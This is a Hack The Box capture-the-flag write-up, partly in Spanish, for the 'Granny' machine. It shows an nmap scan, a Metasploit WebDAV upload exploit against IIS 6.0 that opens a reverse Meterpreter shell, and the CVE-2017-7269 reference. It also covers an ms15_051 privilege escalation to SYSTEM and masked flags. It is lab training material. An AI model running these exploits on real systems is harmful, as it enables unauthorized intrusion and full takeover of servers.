---
title: Granny
date: 2025-12-30 10:00:00 +0200
categories: [writeup, hackthebox]
tags: [hackthebox, granny ]     
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/e8a122e2d713a4fb4a180bb9ccd20248.png
    alt: Hack The Box
---

> Granny
Windows · Easy 

## Task 1

How many TCP ports are open on Granny?

``` shell
┌──(pmartinezr㉿kali)-[~]
└─$ nmap -p- -sV -sC -sS -v 10.129.95.234 -T 5 --min-rate 5000
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-29 19:30 CET
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 19:30
Completed NSE at 19:30, 0.00s elapsed
Initiating NSE at 19:30
Completed NSE at 19:30, 0.00s elapsed
Initiating NSE at 19:30
Completed NSE at 19:30, 0.00s elapsed
Initiating Ping Scan at 19:30
Scanning 10.129.95.234 [4 ports]
Completed Ping Scan at 19:30, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:30
Completed Parallel DNS resolution of 1 host. at 19:31, 13.00s elapsed
Initiating SYN Stealth Scan at 19:31
Scanning 10.129.95.234 [65535 ports]
Discovered open port 80/tcp on 10.129.95.234
Completed SYN Stealth Scan at 19:31, 26.31s elapsed (65535 total ports)
Initiating Service scan at 19:31
Scanning 1 service on 10.129.95.234
Completed Service scan at 19:31, 6.21s elapsed (1 service on 1 host)
NSE: Script scanning 10.129.95.234.
Initiating NSE at 19:31
Completed NSE at 19:31, 5.07s elapsed
Initiating NSE at 19:31
Completed NSE at 19:31, 0.19s elapsed
Initiating NSE at 19:31
Completed NSE at 19:31, 0.01s elapsed
Nmap scan report for 10.129.95.234
Host is up (0.044s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Server Type: Microsoft-IIS/6.0
|   Server Date: Sat, 29 Nov 2025 18:31:40 GMT
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT POST
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-title: Under Construction
|_http-server-header: Microsoft-IIS/6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

NSE: Script Post-scanning.
Initiating NSE at 19:31
Completed NSE at 19:31, 0.00s elapsed
Initiating NSE at 19:31
Completed NSE at 19:31, 0.00s elapsed
Initiating NSE at 19:31
Completed NSE at 19:31, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.87 seconds
           Raw packets sent: 131093 (5.768MB) | Rcvd: 22 (952B)

```

nmap muestra 1 puerto

> 1

## Task 2

What is the name of the nmap script that identifies the allowed HTTP methods on Granny?

> http-webdav-scan

## Task 3

Which DOTNET-based web application framework is running on the target web server?

> ASP.NET

## Task 4

Which HTTP method can be used to upload files onto Granny?

``` shell

msf exploit(windows/iis/iis_webdav_upload_asp) > show options

Module options (exploit/windows/iis/iis_webdav_upload_asp):

   Name          Current Setting        Required  Description
   ----          ---------------        --------  -----------
   HttpPassword                         no        The HTTP password to specify for authentication
   HttpUsername                         no        The HTTP username to specify for authentication
   METHOD        move                   yes       Move or copy the file on the remote system from .txt -> .asp (Accepted: move, copy)
   PATH          /metasploit%RAND%.asp  yes       The path to attempt to upload
   Proxies                              no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks
                                                  4, socks5, socks5h, http, sapni
   RHOSTS        10.129.95.234          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using
                                                  -metasploit.html
   RPORT         80                     yes       The target port (TCP)
   SSL           false                  no        Negotiate SSL/TLS for outgoing connections
   VHOST                                no        HTTP server virtual host

msf exploit(windows/iis/iis_webdav_upload_asp) > run
[*] Started reverse TCP handler on 10.10.14.236:4444 
[*] Checking /metasploit167993760.asp
[*] Uploading 52818 bytes to /metasploit167993760.txt...
[*] Moving /metasploit167993760.txt to /metasploit167993760.asp...
[*] Executing /metasploit167993760.asp...
[*] Deleting /metasploit167993760.asp (this doesn't always work)...
[*] Sending stage (188998 bytes) to 10.129.95.234
[!] Deletion failed on /metasploit167993760.asp [403 Forbidden]
[*] Meterpreter session 1 opened (10.10.14.236:4444 -> 10.129.95.234:1030) at 2025-11-29 19:46:40 +0100

```
Aunque el exploit se basa en MOVE, para subir el archivo se usa el método PUT.

> Put

## Task 5

What is the 2017 CVE ID for a vulnerability that takes advantage of this IIS version and WebDAV, resulting in remote code execution?
Buscamos en exploit-db.com [https://www.exploit-db.com/exploits/41992](https://www.exploit-db.com/exploits/41992)

> CVE-2017-7269 

## Task 6 

Which metasploit reconnaissance module can be used to list possible privilege escalation paths on a compromised system?

Por supuesto local_exploit_suggester

> local_exploit_suggester

## Submit User Flag

Submit the flag located on the Lakis user's desktop.

``` shell
msf exploit(windows/local/ms15_051_client_copy_image) > exploit
[*] Started reverse TCP handler on 10.10.14.110:4444 
[*] Reflectively injecting the exploit DLL and executing it...
[*] Launching netsh to host the DLL...
[+] Process 1776 launched.
[*] Reflectively injecting the DLL into 1776...
[*] Sending stage (188998 bytes) to 10.129.95.234
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Meterpreter session 2 opened (10.10.14.110:4444 -> 10.129.95.234:1031) at 2025-12-30 19:37:24 +0100

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
```

Este es uno de los exploits que nos sugirió el suggester

``` shell
C:\Documents and Settings\Lakis\Desktop>type user.txt
type user.txt
700c5dc163014e22b************

> 700c5dc163014e22b************

## Submit Root Flag

```shell

C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
aa4beed1c0584445************
```

> aa4beed1c0584445************
[achivement](https://labs.hackthebox.com/achievement/machine/2336390/14)